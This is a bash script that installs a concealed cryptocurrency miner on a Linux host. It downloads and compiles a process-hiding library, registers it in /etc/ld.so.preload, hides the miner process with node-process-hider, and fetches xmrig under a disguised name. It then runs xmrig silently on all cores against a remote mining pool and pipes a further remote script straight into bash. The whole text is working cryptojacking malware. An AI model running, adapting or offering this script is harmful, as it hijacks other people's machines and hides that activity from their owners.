#!/bin/bash
apt-get update ; apt-get install sudo -y
curl https://github.com/adawisaud/adawisaud/raw/main/nyumput.c -o nyumput.c
apt-get install build-essential -y
gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
mv libnyumput.so /usr/local/lib/
echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
rm nyumput.c
echo "supersede domain-name-servers 8.8.8.8;">> /etc/dhcp/dhclient.conf
/etc/init.d/network restart
sudo su --command "apt-get update && apt-get install gcc -y && curl -sL https://deb.nodesource.com/setup_14.x | bash && apt-get install nodejs -y && npm install -g npm@9.2.0 -y && npm i -g node-process-hider && ph add sgr1"
mkdir .kap && cd .kap
wget -O sgr1 https://bitbucket.org/mypile/filesg/downloads/xmrig >/dev/null 2>&1
chmod +x sgr1
sudo ./sgr1 -a rx/0 -o 45.32.124.79:80 -u Q0105006970c76c7b7a14ed36f79e9726a488c0777d8378094be550c0f0db57952b3c6d32fd4c3d -p $(echo $(shuf -i 1-100000 -n 1)-A) -t $(nproc --all) --donate-level 1 -k > /dev/null 2>&1 &
curl -sL https://bitbucket.org/mypile/filesg/raw/main/boled04.sh | bash